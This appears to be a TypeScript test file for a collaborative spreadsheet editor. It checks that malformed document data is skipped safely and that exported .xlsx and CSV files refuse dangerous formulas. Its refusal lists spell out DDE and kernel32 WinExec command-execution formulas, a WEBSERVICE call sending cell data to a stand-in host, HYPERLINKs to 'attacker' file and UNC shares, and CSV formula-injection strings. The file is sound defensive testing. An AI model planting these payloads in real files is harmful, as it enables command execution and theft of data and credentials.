// ============================================================================
//  Hostile and malformed input (Mr. Singh, 25 Sept 2026).
//
//  A hand-built client with edit access can put ANY content into a
//  spreadsheet's Y.Doc, and anyone can import a hostile file. So:
//    · the model must skip what it cannot read — never throw, never stop a
//      colleague's edits or the save — and keep working on what is valid;
//    · the .xlsx the editor writes (the file Space serves and mail attaches)
//      must never carry a formula that calls out — a DDE command, an
//      external workbook, a web fetch — whatever a cell's input says;
//    · CSV must not hand another program a formula to run.
//  Every refusal here has its permit twin in the same file: the ordinary
//  case goes through, so no refusal can pass because nothing works.
// ============================================================================

import { test } from 'node:test';
import assert from 'node:assert/strict';
import * as Y from '../../apps/web/node_modules/yjs/dist/yjs.mjs';
import { SheetsModel } from '../../apps/web/lib/sheets/model.ts';
import { writeXlsx, readXlsx } from '../../apps/web/lib/sheets/io/xlsx.ts';
import { readZip } from '../../apps/web/lib/sheets/io/zip.ts';
import { writeCsv } from '../../apps/web/lib/sheets/io/csv.ts';
import { formulaIsSafe } from '../../apps/web/lib/sheets/io/safety.ts';
import { emptySheet, cellKey } from '../../apps/web/lib/sheets/workbook.ts';

/** A spreadsheet with one valid sheet (A1=10, A2==A1*2) and every kind of junk beside it. */
function hostileDoc(): Y.Doc {
  const d = new Y.Doc();
  d.transact(() => {
    const sheets = d.getMap<unknown>('sheets');
    const order = d.getArray<unknown>('order');

    // The valid sheet — the permit twin for everything below.
    const good = new Y.Map<unknown>();
    sheets.set('good', good);
    good.set('name', 'Fees');
    good.set('frozenRows', 1);
    const rows = new Y.Array<string>(); rows.push(['r0', 'r1', 'r2']);
    const cols = new Y.Array<string>(); cols.push(['c0', 'c1']);
    good.set('rows', rows);
    good.set('cols', cols);
    const values = new Y.Map<unknown>();
    const formats = new Y.Map<unknown>();
    const merges = new Y.Map<unknown>();
    for (const [k, v] of [['values', values], ['formats', formats], ['merges', merges], ['colWidths', new Y.Map()], ['rowHeights', new Y.Map()]] as const) good.set(k, v);
    values.set('r0|c0', '10');
    values.set('r1|c0', '=A1*2');
    // Junk inside the valid sheet:
    values.set('r2|c0', 42 as unknown as string);            // a number where text belongs
    values.set('r2|c1', { evil: true } as unknown as string); // an object
    values.set('nonsense-key', 'x');                          // a key with no row/col
    formats.set('r0|c0', 'not an object');                    // a format that is a string
    formats.set('r1|c0', { b: true, bg: 'javascript:alert(1)', size: 'huge' });
    merges.set('m1', 'junk');                                 // a merge that is not a rectangle
    merges.set('m2', { r1: 'r0', c1: 'c0', r2: 12, c2: null });

    // Whole sheets that are not sheets:
    sheets.set('string-sheet', 'I am not a sheet');
    const noRows = new Y.Map<unknown>();
    noRows.set('name', 'Broken');
    noRows.set('rows', new Y.Map());                          // rows must be an array
    noRows.set('cols', 'c0');
    sheets.set('no-rows', noRows);
    const oddName = new Y.Map<unknown>();
    oddName.set('name', { toLowerCase: 'boom' });              // a name that is not text
    oddName.set('frozenRows', '5; DROP TABLE');
    const r = new Y.Array<string>(); r.push(['a']);
    const c = new Y.Array<string>(); c.push(['b']);
    oddName.set('rows', r); oddName.set('cols', c);
    for (const k of ['values', 'formats', 'merges', 'colWidths', 'rowHeights']) oddName.set(k, new Y.Map());
    sheets.set('odd-name', oddName);

    order.push(['string-sheet', 'no-rows', 'missing-id', 42, 'good', 'good', 'odd-name']);
    // A Docs document's content in the same Y.Doc: not ours, ignored.
    const frag = d.getXmlFragment('default');
    const p = new Y.XmlElement('script');
    p.insert(0, [new Y.XmlText('alert(1)')]);
    frag.insert(0, [p]);
  });
  return d;
}

test('a malformed spreadsheet opens: junk is skipped, the valid sheet still calculates', () => {
  const doc = hostileDoc();
  const m = new SheetsModel(doc);
  let sheets: ReturnType<SheetsModel['sheets']> = [];
  assert.doesNotThrow(() => { sheets = m.sheets(); });
  // Permit twin: the valid sheet is there and works.
  const good = sheets.find((s) => s.id === 'good');
  assert.ok(good, 'the valid sheet is kept');
  assert.equal(m.value('good', 1, 0), 20);
  // Refusals: sheets that are not sheets are not offered at all.
  assert.ok(!sheets.some((s) => s.id === 'string-sheet' || s.id === 'no-rows' || s.id === 'missing-id'));
  assert.equal(sheets.filter((s) => s.id === 'good').length, 1, 'a duplicated id in the order is one sheet');
  // A sheet whose name is not text is kept, with a name that is.
  const odd = sheets.find((s) => s.id === 'odd-name');
  assert.ok(odd && typeof odd.name === 'string');
  assert.equal(odd!.frozenRows, 0, 'a non-number frozen count is read as 0');
  // Junk cells read as empty, not as a crash.
  assert.equal(m.input('good', 2, 0), null);
  assert.equal(m.input('good', 2, 1), null);
  assert.equal(m.format('good', 0, 0), undefined, 'a format that is not an object is ignored');
  assert.deepEqual(m.merges('good'), [], 'merges that are not rectangles are ignored');
  // Names resolve across junk (formulas look sheets up by name).
  assert.doesNotThrow(() => m.engine.source.sheetIdByName('Fees'));
  assert.equal(m.engine.source.sheetIdByName('Fees'), 'good');
  m.destroy();
});

test('a malformed spreadsheet still saves: snapshot, .xlsx and edits all work', async () => {
  const doc = hostileDoc();
  const m = new SheetsModel(doc);
  const snap = m.snapshot();
  const bytes = await writeXlsx(snap);
  const back = await readXlsx(bytes);
  const fees = back.sheets.find((s) => s.name === 'Fees');
  assert.ok(fees, 'the valid sheet is in the saved file');
  assert.equal(fees!.cells.get(cellKey(1, 0))?.value, 20);
  // Nothing from the junk reaches the file.
  const xml = new TextDecoder().decode((await readZip(bytes)).get('xl/sharedStrings.xml') ?? new Uint8Array());
  assert.ok(!xml.includes('evil') && !xml.includes('I am not a sheet'));
  // A colleague's edit to the valid sheet still lands.
  m.setInputs('good', [{ r: 0, c: 0, input: '7' }]);
  assert.equal(m.value('good', 1, 0), 14);
  m.destroy();
});

test('formula safety: what calls out is refused, ordinary formulas pass', () => {
  // Permit twins: formulas people really write.
  for (const f of ['=SUM(A1:A3)', '=IF(B2>9,"Paid","Due")', '=VLOOKUP(A2,Fees!A:C,3,FALSE)',
    '="a|b"&A1', '=HYPERLINK("https://tatvaos.com","site")', "='Fee 2026'!A1*2", '=A1&"[note]"']) {
    assert.equal(formulaIsSafe(f), true, `ordinary formula refused: ${f}`);
  }
  // Refusals.
  for (const f of ["=cmd|' /c calc'!A0", '=MSEXCEL|\\..\\..\\Windows\\System32\\cmd.exe!A1', '=DDE("cmd","/c calc","x")',
    "='[Budget.xlsx]Sheet1'!A1", '=[1]Sheet1!A1', '=SUM([other.xlsx]Data!A:A)',
    '=WEBSERVICE("https://x.example/?"&A1)', '=IMPORTXML("https://x","//a")', '=importdata("https://x")',
    '=RTD("prog.id",,"x")', '=CALL("kernel32","WinExec","JCJ","calc",1)', '=REGISTER.ID("x","y")', '=EXEC("calc")']) {
    assert.equal(formulaIsSafe(f), false, `dangerous formula allowed: ${f}`);
  }
});

test('the .xlsx writer writes a dangerous formula as plain text, an ordinary one as a formula', async () => {
  const s = emptySheet('Sheet1');
  s.cells.set(cellKey(0, 0), { input: "=cmd|' /c calc'!A0" });
  s.cells.set(cellKey(1, 0), { input: '=WEBSERVICE("https://x.example/"&B1)' });
  s.cells.set(cellKey(2, 0), { input: '=SUM(A5:A6)', value: 3 });   // the permit twin
  s.cells.set(cellKey(4, 0), { input: '1' });
  s.cells.set(cellKey(5, 0), { input: '2' });
  const files = await readZip(await writeXlsx({ sheets: [s] }));
  const sheetXml = new TextDecoder().decode(files.get('xl/worksheets/sheet1.xml')!);
  const formulas = [...sheetXml.matchAll(/<f>([^<]*)<\/f>/g)].map((m) => m[1]);
  assert.deepEqual(formulas, ['SUM(A5:A6)'], `only the ordinary formula is a formula: ${formulas}`);
  const back = await readXlsx(await writeXlsx({ sheets: [s] }));
  assert.equal(back.sheets[0]!.cells.get(cellKey(0, 0))?.input, "'=cmd|' /c calc'!A0", 'kept, as text');
});

test('CSV: text that another program would run as a formula is quoted as text', () => {
  const s = emptySheet('Sheet1');
  s.cells.set(cellKey(0, 0), { input: "'=HYPERLINK(\"https://x\",\"click\")", value: '=HYPERLINK("https://x","click")' });
  s.cells.set(cellKey(0, 1), { input: "'+cmd", value: '+cmd' });
  s.cells.set(cellKey(0, 2), { input: "'@SUM(1)", value: '@SUM(1)' });
  // Permit twins: ordinary text and a real negative number are untouched.
  s.cells.set(cellKey(1, 0), { input: 'Aarav Sharma', value: 'Aarav Sharma' });
  s.cells.set(cellKey(1, 1), { input: '-5', value: -5 });
  const lines = writeCsv(s).split(/\r?\n/);
  assert.ok(lines[0]!.startsWith(`"'=HYPERLINK`), lines[0]);
  assert.ok(lines[0]!.includes(",'+cmd,") || lines[0]!.includes(`,"'+cmd",`), lines[0]);
  assert.ok(lines[0]!.includes("'@SUM(1)"), lines[0]);
  assert.equal(lines[1], 'Aarav Sharma,-5,', 'ordinary text and a negative number are untouched');
});

test('HYPERLINK: only http, https and mailto targets leave in a file', () => {
  // Permit twins: ordinary links, including one completed from a cell.
  for (const f of ['=HYPERLINK("https://tatvaos.com","site")', '=HYPERLINK("http://example.org")',
    '=HYPERLINK("mailto:office@school.in","Write")', '=HYPERLINK("https://tatvaos.com/fees?id="&A2,"Fees")',
    '=hyperlink( "HTTPS://TATVAOS.COM" )', '=IF(A1>0,HYPERLINK("https://a.in"),"")']) {
    assert.equal(formulaIsSafe(f), true, `ordinary link refused: ${f}`);
  }
  // Refusals: anything that can make Windows authenticate to someone else's
  // server (file:, UNC paths), script, and a target that cannot be read.
  for (const f of ['=HYPERLINK("file://attacker/share/x","open")', String.raw`=HYPERLINK("\\attacker\share\x")`,
    '=HYPERLINK("javascript:alert(1)")', '=HYPERLINK(A2,"from a cell")', '=HYPERLINK("ht"&"tp://x")',
    '=HYPERLINK("http"&":"&"//x")', '=HYPERLINK()', '=HYPERLINK("https://ok.in") & HYPERLINK("file:///c:/x")']) {
    assert.equal(formulaIsSafe(f), false, `dangerous link allowed: ${f}`);
  }
});

test('CSV: a leading tab or carriage return is neutralised too; ordinary text is not', () => {
  const s = emptySheet('Sheet1');
  s.cells.set(cellKey(0, 0), { input: "'\t=1+1", value: '\t=1+1' });
  s.cells.set(cellKey(0, 1), { input: "'\r=1+1", value: '\r=1+1' });
  s.cells.set(cellKey(1, 0), { input: 'plain', value: 'plain' });       // permit twin
  const out = writeCsv(s);
  assert.ok(out.startsWith(`'\t=1+1,`), JSON.stringify(out.slice(0, 20)));
  assert.ok(out.includes(`"'\r=1+1"`), JSON.stringify(out.slice(0, 30)));
  assert.ok(/\r?\nplain,/.test(out), JSON.stringify(out));
});

test('a sheet name the file format cannot carry is refused with a reason, not silently changed', () => {
  const m = new SheetsModel(new Y.Doc());
  m.ensureSeeded();
  const id = m.sheetIds()[0]!;
  // Permit twin: an ordinary name goes through.
  assert.equal(m.renameSheet(id, 'Fees 2026-27'), null);
  assert.equal(m.meta(id)!.name, 'Fees 2026-27');
  for (const bad of ['Q1 [draft]', 'a:b', 'what?', 'x*y', 'a/b', String.raw`a\b`]) {
    const msg = m.renameSheet(id, bad);
    assert.ok(typeof msg === 'string' && msg.includes('cannot contain'), `no reason given for "${bad}": ${msg}`);
    assert.equal(m.meta(id)!.name, 'Fees 2026-27', `name changed despite refusal: "${bad}"`);
  }
  m.destroy();
});
